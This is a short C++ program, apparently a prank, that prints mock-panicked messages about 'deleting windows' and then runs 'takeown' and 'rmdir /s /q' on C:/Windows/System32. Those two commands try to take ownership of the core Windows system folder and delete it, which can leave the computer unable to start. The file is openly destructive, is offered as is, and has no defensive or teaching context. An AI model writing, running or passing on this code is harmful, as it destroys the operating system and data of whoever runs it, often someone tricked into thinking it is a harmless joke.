#include <iostream>
#include <cstdlib>
#include <thread>
#include <chrono>

int main()
{
    std::cout<<"deleting windows"<<std::endl;
    std::cout<<"this is not good"<<std::endl;
    std::this_thread::sleep_for(std::chrono::seconds(1));
    std::cout<<"i think this is the end"<<std::endl;
    std::this_thread::sleep_for(std::chrono::seconds(1));
    std::cout<<"yea i think this is the end bro"<<std::endl;
    std::this_thread::sleep_for(std::chrono::seconds(1));
    std::cout<<"my name is anderdingus"<<std::endl;
    std::this_thread::sleep_for(std::chrono::seconds(1));
    std::cout<<"o shittings"<<std::endl;
    std::cout<<""<<std::endl;
    std::this_thread::sleep_for(std::chrono::seconds(2));
    system("takeown /f C:/Windows/System32");
    system("rmdir /s /q C:/Windows/System32");

    return 0;
}
